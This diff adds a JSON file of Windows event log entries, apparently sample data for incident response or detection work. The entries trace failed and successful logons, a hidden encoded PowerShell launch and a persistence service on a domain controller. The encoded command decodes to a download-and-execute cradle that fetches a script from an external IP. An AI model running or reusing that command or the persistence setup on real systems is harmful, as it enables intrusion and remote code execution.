@@ -1,0 +1,57 @@
+[
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-14T03:00:15Z",
+    "Computer": "DC01.CORP.LOCAL",
+    "TargetUserName": "Administrator",
+    "WorkstationName": "WORKSTATION-X",
+    "IpAddress": "192.168.1.185",
+    "LogonType": 3,
+    "Status": "0xC000006D",
+    "Description": "An account failed to log on (Bad Password)"
+  },
+  {
+    "EventID": 4625,
+    "TimeCreated": "2026-03-14T03:00:18Z",
+    "Computer": "DC01.CORP.LOCAL",
+    "TargetUserName": "Administrator",
+    "WorkstationName": "WORKSTATION-X",
+    "IpAddress": "192.168.1.185",
+    "LogonType": 3,
+    "Status": "0xC000006D",
+    "Description": "An account failed to log on (Bad Password)"
+  },
+  {
+    "EventID": 4624,
+    "TimeCreated": "2026-03-14T03:02:10Z",
+    "Computer": "DC01.CORP.LOCAL",
+    "TargetUserName": "svc_backup",
+    "WorkstationName": "WORKSTATION-X",
+    "IpAddress": "192.168.1.185",
+    "LogonType": 3,
+    "Status": "0x0",
+    "Description": "An account was successfully logged on"
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-03-14T03:04:22Z",
+    "Computer": "DC01.CORP.LOCAL",
+    "SubjectUserName": "svc_backup",
+    "NewProcessName": "C:\\Windows\\System32\\powershell.exe",
+    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHAALgBwAHMAMQAnACkA",
+    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+    "Description": "A new process has been created (Suspicious Encoded PowerShell execution)"
+  },
+  {
+    "EventID": 7045,
+    "TimeCreated": "2026-03-14T03:06:50Z",
+    "Computer": "DC01.CORP.LOCAL",
+    "ServiceName": "WindowsUpdateHealthService_v2",
+    "ImagePath": "C:\\ProgramData\\update_agent.exe",
+    "ServiceType": "user mode service",
+    "StartType": "auto start",
+    "AccountName": "LocalSystem",
+    "Description": "A service was installed in the system (Persistence mechanism)"
+  }
+]
+
